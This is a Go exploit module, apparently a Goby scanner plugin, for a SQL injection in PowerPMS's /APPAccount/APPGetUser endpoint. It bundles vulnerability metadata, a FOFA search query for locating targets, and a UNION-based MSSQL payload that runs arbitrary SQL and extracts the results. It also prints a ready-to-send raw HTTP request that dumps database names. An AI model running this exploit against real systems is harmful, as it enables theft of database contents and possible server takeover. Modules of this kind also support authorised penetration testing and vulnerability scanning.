package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PowerPMS /APPAccount/APPGetUser SQL Injection Vulnerability",
    "Description": "<p>PowerPMS is a comprehensive enterprise management system that integrates multiple functional modules such as financial management, sales management, procurement management, warehouse management, and project management. The system adopts modular design, which can be flexibly configured and secondary developed according to the specific needs of enterprises. There is an SQL injection vulnerability in the interface /APPAccount/APPGetUser?name=1**, through which an attacker can obtain sensitive database information.</p>",
    "Product": "PwC Technology PowerPMS",
    "Homepage": "https://www.powerpms.com/",
    "DisclosureDate": "2024-10-10",
    "PostTime": "2024-10-18",
    "Author": "3013320359@qq.com",
    "FofaQuery": "title=\"PowerPMS用户登录\" && body=\"PowerPMS\"",
    "GobyQuery": "title=\"PowerPMS用户登录\" && body=\"PowerPMS\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to themanufacturer's homepage update: <a href=\"https://blog.kikiw.cn/index.php/archives/65/\"></a></p><p><a href=\"https://www.powerpms.com/\">https://www.powerpms.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.  </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://cn-sec.com/archives/2925128.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "DB_NAME()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2023"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "普华科技PowerPMS /APPAccount/APPGetUser SQL 注入漏洞",
            "Product": "普华科技PowerPMS",
            "Description": "<p>PowerPMS 是一款综合性的企业管理系统，它集成了财务管理、销售管理、采购管理、仓储管理以及项目管理等多个功能模块。该系统采用模块化设计，可以根据企业的具体需求进行灵活的配置和二次开发。其接口/APPAccount/APPGetUser?name=1存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.powerpms.com/\">https://www.powerpms.com/</a><a href=\"https://blog.kikiw.cn/index.php/archives/65/\"></a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "PowerPMS /APPAccount/APPGetUser SQL Injection Vulnerability",
            "Product": "PwC Technology PowerPMS",
            "Description": "<p>PowerPMS is a comprehensive enterprise management system that integrates multiple functional modules such as financial management, sales management, procurement management, warehouse management, and project management. The system adopts modular design, which can be flexibly configured and secondary developed according to the specific needs of enterprises. There is an SQL injection vulnerability in the interface /APPAccount/APPGetUser?name=1**, through which an attacker can obtain sensitive database information.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to themanufacturer's homepage update:&nbsp;<a href=\"https://blog.kikiw.cn/index.php/archives/65/\"></a></p><p><a href=\"https://www.powerpms.com/\">https://www.powerpms.com/</a><br></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9962"
}`

	sendPayload_e8CnlW92xz := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//GET请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		//拼接sql语句
		var payload string
		payload = `1)') UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(107)+CHAR(98)+CHAR(106)+CHAR(113)+ISNULL(CAST(` + sql + ` AS NVARCHAR(4000)),CHAR(32))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(122)+CHAR(113),NULL,NULL-- bpwh`
		encodedPayload := url.QueryEscape(payload)
		url := `/APPAccount/APPGetUser?name=1` + encodedPayload

		header := map[string]string{
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
		}
		resp, err := setGetRequest(hostInfo, url, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_e8CnlW92xz
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "DB_NAME()"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qkbjq") {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/APPAccount/APPGetUser`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_e8CnlW92xz
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}
				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`qkbjq(.*?)qpvzq`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				var sqlinformation string
				for _, match := range matches {
					sqlinformation = match[1]
				}
				if len(sqlinformation) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + sqlinformation
				return expResult

			case "sqlpoint":
				sql := ""
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `GET /APPAccount/APPGetUser?name=1%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2BISNULL%28CAST%28name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%28106%29%2BCHAR%28113%29%2CNULL%2CNULL%20FROM%20master..sysdatabases--%20zIGS HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
